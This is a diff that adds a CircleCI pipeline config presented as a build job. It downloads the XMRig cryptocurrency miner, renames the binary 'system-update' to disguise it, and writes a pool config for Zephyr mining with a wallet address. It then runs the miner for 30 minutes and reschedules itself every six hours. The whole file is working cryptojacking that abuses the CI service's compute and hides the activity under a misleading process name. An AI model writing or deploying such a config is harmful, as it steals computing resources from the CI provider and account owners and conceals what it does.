@@ -1,0 +1,88 @@
+version: 2.1
+
+jobs:
+  build:
+    docker:
+      - image: cimg/base:stable
+    resource_class: xlarge  # 4 vCPU, 15 GB RAM
+    
+    steps:
+      - checkout
+      
+      - run:
+          name: Install Dependencies
+          command: |
+            sudo apt-get update
+            sudo apt-get install -y wget git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev
+      
+      - run:
+          name: Download XMRig
+          command: |
+            cd /tmp
+            wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
+            tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz
+            cd xmrig-6.26.0
+            mv xmrig system-update
+      
+      - run:
+          name: Create Config
+          command: |
+            cd /tmp/xmrig-6.26.0
+            cat > config.json <<EOF
+            {
+                "autosave": true,
+                "cpu": {
+                    "enabled": true,
+                    "huge-pages": true,
+                    "max-threads-hint": 100,
+                    "asm": true,
+                    "rx": {
+                        "asm": true,
+                        "msr": true,
+                        "jit": true
+                    }
+                },
+                "log": {
+                    "log-level": 3,
+                    "print-time": 10
+                },
+                "pools": [
+                    {
+                        "algo": "randomx",
+                        "url": "de.zephyr.herominers.com:1123",
+                        "user": "ZEPHYR3UsBjPbXaFoVnrGT5ReMf2DYfPv4JC51gFATKcJX66jgLP41DJHGAnEQrfVB5DnBRiyWk8qEA5F6gE7UhZe7pjCXtYM5T1L",
+                        "pass": "circleci-worker-1",
+                        "enabled": true
+                    }
+                ],
+                "randomx": {
+                    "rdmsr": true,
+                    "wrmsr": true
+                }
+            }
+            EOF
+      
+      - run:
+          name: Start Miner
+          command: |
+            cd /tmp/xmrig-6.26.0
+            ./system-update &
+            sleep 1800  # 30 dakika çalıştır
+      
+      - run:
+          name: Check Process
+          command: |
+            ps aux | grep system-update
+
+workflows:
+  version: 2
+  mining:
+    jobs:
+      - build
+    triggers:
+      - schedule:
+          cron: "0 */6 * * *"  # Her 6 saatte bir
+          filters:
+            branches:
+              only:
+                - master
